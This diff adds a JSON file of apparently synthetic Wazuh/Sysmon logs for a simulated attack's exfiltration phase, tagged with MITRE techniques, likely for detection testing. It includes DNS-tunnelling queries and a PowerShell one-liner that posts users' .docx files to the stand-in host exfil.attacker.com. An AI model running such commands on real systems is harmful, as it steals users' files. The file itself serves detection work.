@@ -1,0 +1,498 @@
+{
+  "_metadata": {
+    "phase": "exfiltration",
+    "phase_index": 9,
+    "total_logs": 7,
+    "techniques": [
+      "T1041",
+      "T1048.003",
+      "T1567.002"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "DNS tunneling exfiltration",
+      "sequence": 55,
+      "timestamp": "2026-02-24T12:00:57.823710Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1048.003",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 22: DNSEvent (DNS query)",
+          "id": "100122",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1048.003"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1071.004,technique_name=DNS Tunneling",
+              "utcTime": "2026-02-24 12:00:57.823",
+              "processGuid": "{FD12E5CD-WS01-0047-D2D2ACEB6EBD}",
+              "processId": "5713",
+              "queryName": "YWRtaW46cGFzc3dvcmQ.data.exfil-cdn.com",
+              "queryStatus": "0",
+              "queryResults": "::ffff:185.220.101.1",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "user": "CORP\\user1"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "DNS tunneling chunk 1",
+      "sequence": 56,
+      "timestamp": "2026-02-24T12:01:03.075002Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1048.003",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 22: DNSEvent (DNS query)",
+          "id": "100122",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1048.003"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1071.004,technique_name=DNS Tunneling",
+              "utcTime": "2026-02-24 12:01:03.075",
+              "processGuid": "{FD12E5CD-WS01-0048-6D38A09A418D}",
+              "processId": "5713",
+              "queryName": "chunk0_2644.data.exfil-cdn.com",
+              "queryStatus": "0",
+              "queryResults": "::ffff:185.220.101.1",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "user": "CORP\\user1"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "DNS tunneling chunk 2",
+      "sequence": 57,
+      "timestamp": "2026-02-24T12:01:10.200122Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1048.003",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 22: DNSEvent (DNS query)",
+          "id": "100122",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1048.003"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1071.004,technique_name=DNS Tunneling",
+              "utcTime": "2026-02-24 12:01:10.200",
+              "processGuid": "{FD12E5CD-WS01-0049-2C272C66575F}",
+              "processId": "5713",
+              "queryName": "chunk1_6568.data.exfil-cdn.com",
+              "queryStatus": "0",
+              "queryResults": "::ffff:185.220.101.1",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "user": "CORP\\user1"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "DNS tunneling chunk 3",
+      "sequence": 58,
+      "timestamp": "2026-02-24T12:01:19.459434Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1048.003",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 22: DNSEvent (DNS query)",
+          "id": "100122",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1048.003"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1071.004,technique_name=DNS Tunneling",
+              "utcTime": "2026-02-24 12:01:19.459",
+              "processGuid": "{FD12E5CD-WS01-0050-F264906D7508}",
+              "processId": "5713",
+              "queryName": "chunk2_2887.data.exfil-cdn.com",
+              "queryStatus": "0",
+              "queryResults": "::ffff:185.220.101.1",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "user": "CORP\\user1"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Exfiltration over C2 channel",
+      "sequence": 59,
+      "timestamp": "2026-02-24T12:01:24.246027Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1041",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "PowerShell ScriptBlock logging (Event 4104)",
+          "id": "100400",
+          "mitre": {
+            "id": [
+              "T1041"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1041"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "powershell"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4104",
+              "channel": "Microsoft-Windows-PowerShell/Operational",
+              "providerName": "Microsoft-Windows-PowerShell",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "4104",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "messageNumber": "1",
+              "messageTotal": "1",
+              "scriptBlockText": "$data = Get-Content C:\\Users\\*\\Documents\\*.docx -Raw; Invoke-WebRequest -Uri https://exfil.attacker.com/upload -Method POST -Body $data",
+              "scriptBlockId": "{FD12E5CD-WS01-0051-90F4974CB952}",
+              "path": ""
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Exfiltration network connection",
+      "sequence": 60,
+      "timestamp": "2026-02-24T12:01:32.865783Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1041",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1041"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1041"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 12:01:32.865",
+              "processGuid": "{FD12E5CD-WS01-0052-F4B19C770957}",
+              "processId": "6203",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.0.0.50",
+              "sourcePort": "64250",
+              "destinationIp": "185.220.101.100",
+              "destinationHostname": "exfil.attacker.com",
+              "destinationPort": "443"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Exfiltration to cloud storage",
+      "sequence": 61,
+      "timestamp": "2026-02-24T12:01:38.093326Z",
+      "attack_phase": "exfiltration",
+      "technique": "T1567.002",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1567.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "T1567.002"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 12:01:38.093",
+              "processGuid": "{FD12E5CD-WS01-0053-BE5DBF88FEF8}",
+              "processId": "6385",
+              "image": "C:\\Windows\\System32\\curl.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.0.0.50",
+              "sourcePort": "61692",
+              "destinationIp": "198.51.100.50",
+              "destinationHostname": "transfer.sh",
+              "destinationPort": "443"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
